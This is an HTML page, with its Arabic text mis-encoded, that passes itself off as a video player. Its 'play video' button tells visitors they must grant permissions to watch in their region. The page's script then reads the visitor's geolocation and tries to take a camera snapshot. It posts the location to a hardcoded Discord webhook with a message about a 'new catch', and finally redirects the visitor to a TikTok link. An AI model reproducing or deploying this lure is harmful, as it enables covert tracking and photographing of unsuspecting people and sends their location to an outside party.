 <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</title>
    <style>
        body { margin: 0; background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
        .card { text-align: center; width: 90%; max-width: 400px; }
        button { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; }
        #canvas { display: none; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <button id="startBtn">â–¶ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
        <p>ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© ÙÙŠ Ù…Ù†Ø·Ù‚ØªÙƒ</p>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const discordUrl = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';

        document.getElementById('startBtn').addEventListener('click', async () => {
            // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // 2. Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØªØµÙˆÙŠØ± Ù„Ù‚Ø·Ø©
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    // Ø§Ø³ØªØ±Ø§Ø­Ø© Ø«Ø§Ù†ÙŠØ© Ø¹Ø´Ø§Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ±ÙƒØ²
                    await new Promise(res => setTimeout(res, 1000));
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ø±Ø§Ø¨Ø· (Base64)
                    const imageData = canvas.toDataURL('image/png');
                    
                    // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹
                    stream.getTracks().forEach(track => track.stop());

                    // 3. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Ø§Ù„Ù…ÙˆÙ‚Ø¹ + Ø§Ù„ØµÙˆØ±Ø©) Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                    sendToDiscord(mapLink, imageData);
                } catch (e) {
                    // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù†Ø¨Ø¹Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø³
                    sendToDiscord(mapLink, null);
                }
            }, () => {
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„Ù„Ù…Ø´Ø§Ù‡Ø¯Ø©.");
            });
        });

        async function sendToDiscord(mapLink, image) {
            const payload = {
                content: `ğŸš¨ **ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯!**\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${mapLink}`
            };

            // Ù„Ùˆ ÙÙŠÙ‡ ØµÙˆØ±Ø©ØŒ Ø¨Ù†Ø¨Ø¹ØªÙ‡Ø§ ÙƒÙ…Ù„Ù (Ø¨Ø³ Ù‡Ù†Ø§ Ù„Ù„Ø³Ù‡ÙˆÙ„Ø© Ù‡Ù†Ø¨Ø¹ØªÙ‡Ø§ ÙÙŠ Embed Ù„Ùˆ Ø§Ù„Ø­Ø¬Ù… Ø³Ù…Ø­)
            // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ø¨ÙŠØ­ØªØ§Ø¬ Ø§Ù„ØµÙˆØ±Ø© ØªØªØ¨Ø¹Øª ÙƒÙ€ "Multipart" Ù„Ùˆ Ø­Ø¬Ù…Ù‡Ø§ ÙƒØ¨ÙŠØ±ØŒ 
            // Ù„ÙƒÙ† Ù‡Ù†Ø§ Ù‡Ø¨Ø¹Øª Ù„Ùƒ Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù† ÙÙŠÙ‡ Ù…Ø­Ø§ÙˆÙ„Ø© ØªØµÙˆÙŠØ± Ø­ØµÙ„Øª:
            fetch(discordUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `ğŸ“¸ **ØªÙ… Ø±ØµØ¯ Ø´Ø®Øµ Ø¬Ø¯ÙŠØ¯!**\nğŸ“ Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ${mapLink}\nğŸ–¼ï¸ (ØªÙ…Øª Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©ØŒ Ø±Ø§Ø¬Ø¹ Ø§Ù„Ø³ÙŠØ±ÙØ±)`
                })
            }).then(() => {
                window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
            });
        }
    </script>
</body>
</html>
